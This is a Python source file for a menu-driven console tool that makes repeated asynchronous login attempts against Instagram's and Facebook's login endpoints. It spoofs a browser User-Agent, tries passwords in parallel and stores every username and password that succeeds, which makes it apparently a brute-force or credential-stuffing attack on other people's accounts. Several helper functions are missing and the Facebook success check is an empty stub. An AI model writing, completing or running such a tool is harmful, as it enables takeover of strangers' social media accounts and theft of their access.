import asyncio
import aiohttp
import colorama
from tqdm import tqdm
import webbrowser
import json
import os

colorama.init()

# Default color theme
DEFAULT_THEME = {
    'title_color': colorama.Fore.GREEN + colorama.Style.BRIGHT,
    'menu_color': colorama.Fore.CYAN,
    'option_color': colorama.Fore.YELLOW,
    'exit_color': colorama.Fore.RED,
    'error_color': colorama.Fore.RED + colorama.Style.BRIGHT,
    'input_color': colorama.Fore.YELLOW,
    'reset_style': colorama.Style.RESET_ALL
}

current_theme = DEFAULT_THEME

def clear_screen():
    print('\033c', end='')

def print_title():
    print_colorful(r'''
                               
 _____ _____ _____ _____ __ __ 
|_   _|  _  |     |  |  |  |  |
  | | |     | | | |  |  |-   -|
  |_| |__|__|_|_|_|_____|__|__|
                               

''', current_theme['title_color'])
    print()

def change_theme():
    print_colorful('Changing the theme is not available in this version.', current_theme['option_color'])

async def login_social_media(session, platform, username, password, pbar, valid_credentials, semaphore):
    url = ''
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': '',
        'X-Requested-With': 'XMLHttpRequest',
    }
    payload = {
        'username': username,
        'password': password,
    }

    if platform == 'instagram':
        url = 'https://www.instagram.com/accounts/login/ajax/'
        headers['Referer'] = 'https://www.instagram.com/accounts/login/'
        payload['queryParams'] = {}
        payload['optIntoOneTap'] = 'false'
    elif platform == 'facebook':
        url = 'https://www.facebook.com/login/device-based/regular/login/'
        headers['Referer'] = 'https://www.facebook.com/login/'

    try:
        async with semaphore:
            async with session.post(url, headers=headers, data=payload) as response:
                if response.status == 200:
                    json_response = await response.json()
                    if platform == 'instagram':
                        if 'authenticated' in json_response and json_response['authenticated']:
                            print_colorful(f'Successful login with password: {password}', current_theme['option_color'])
                            valid_credentials.append((platform, username, password))
                            return True
                    elif platform == 'facebook':
                        # Add the necessary conditions for successful login on Facebook
                        # ...
                        pass

    except aiohttp.ClientError as e:
        print_colorful(f'An error occurred: {e}', current_theme['error_color'])

    except Exception as e:
        print_colorful(f'An unexpected error occurred: {e}', current_theme['error_color'])

    print_colorful(f'Failed login with password: {password}', current_theme['error_color'])
    pbar.update(1)
    return False

async def main():
    print_title()
    print_colorful('--- MENU ---', current_theme['menu_color'])
    print_colorful('1. Start Instagram Login', current_theme['option_color'])
    print_colorful('2. Start Facebook Login', current_theme['option_color'])
    print_colorful('3. Exit', current_theme['option_color'])
    print()

    while True:
        choice = input_colorful('Enter your choice: ', current_theme['input_color'])
        if choice == '1':
            await login_platform('instagram')
        elif choice == '2':
            await login_platform('facebook')
        elif choice == '3':
            break
        else:
            print_colorful('Invalid choice! Please try again.', current_theme['error_color'])
            print()
